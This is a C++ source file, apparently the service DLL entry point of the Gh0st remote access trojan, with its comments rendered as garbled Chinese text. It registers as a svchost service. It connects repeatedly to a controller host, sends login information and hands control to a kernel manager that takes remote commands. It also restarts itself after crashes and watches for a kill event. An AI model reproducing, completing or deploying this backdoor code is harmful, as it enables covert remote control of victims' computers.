// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include "stdafx.h"
#include "until.h"
#include "PrincDll.h"
#include "ClientSocket.h"
#include "LogIn.h"
#include "KernelManager.h"
#include "install.h"

//force dll main
#ifdef _X86_
extern "C" { int _afxForceUSRDLL; }
#else
extern "C" { int __afxForceUSRDLL; }
#endif


enum
{
	NOT_CONNECT, //  ��û������
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};
// variables
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
wchar_t	svcname[MAX_PATH];


#define		HEART_BEAT_TIME		1000 * 60 * 3 // ����ʱ��

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// �����쳣�����´�������
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

DWORD WINAPI main(wchar_t *lpServiceName)
{
	// lpServiceName,��ServiceMain���غ��û����
	wchar_t	strServiceName[256];
	wchar_t	strKillEvent[50];
	//HANDLE	hInstallMutex = NULL;
	wsprintf(strKillEvent, _T("Global\\Gh0st %d"), GetTickCount()); // ����¼���

	// ���߲���ϵͳ:���û���ҵ�CD/floppy disc,��Ҫ����������
	SetErrorMode( SEM_FAILCRITICALERRORS);
	wchar_t	*lpszHost = NULL;
	DWORD	dwPort = 80;



	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������
	while (1)
	{
		// �������������ʱ��������sleep������
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					//break;
				}
				// ��һ��
				Sleep(60);
			}
		}
		
		DWORD dwTickCount = GetTickCount();
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}
		// ��¼
		
		DWORD dwExitCode = SOCKET_ERROR;
		lstrcpy(strServiceName, lpServiceName);
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}

	SetErrorMode(0);
	//ReleaseMutex(hInstallMutex);
	//CloseHandle(hInstallMutex);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" PRINCDLL_API void ServiceMain( int argc, wchar_t* argv[] )
{
	wcsncpy(svcname, (wchar_t*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
	//wcstombs(svcname, argv[0], sizeof svcname);
	hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
	if( hServiceStatus == NULL )
	{
		return;
	}else FreeConsole();

	TellSCM( SERVICE_START_PENDING, 0, 1 );
	TellSCM( SERVICE_RUNNING, 0, 0);
	// call Real Service function noew

	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	do{
		Sleep(100);//not quit until receive stop command, otherwise the service will stop
	}while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	if (g_dwServiceType == 0x120)
	{
		//Shared�ķ��� ServiceMain ���˳�����ȻһЩϵͳ��svchost����Ҳ���˳�
		while (1) Sleep(10000);
	}
	return;
}

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
	SERVICE_STATUS srvStatus;
	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwCurrentState = g_dwCurrState = dwState;
	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode = dwExitCode;
	srvStatus.dwServiceSpecificExitCode = 0;
	srvStatus.dwCheckPoint = dwProgress;
	srvStatus.dwWaitHint = 1000;
	return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
	// not really necessary because the service stops quickly
	switch( dwControl )
	{
	case SERVICE_CONTROL_STOP:
		TellSCM( SERVICE_STOP_PENDING, 0, 1 );
		Sleep(10);
		TellSCM( SERVICE_STOPPED, 0, 0 );
		break;
	case SERVICE_CONTROL_PAUSE:
		TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
		TellSCM( SERVICE_PAUSED, 0, 0 );
		break;
	case SERVICE_CONTROL_CONTINUE:
		TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
		TellSCM( SERVICE_RUNNING, 0, 0 );
		break;
	case SERVICE_CONTROL_INTERROGATE:
		TellSCM( g_dwCurrState, 0, 0 );
		break;
	}
}
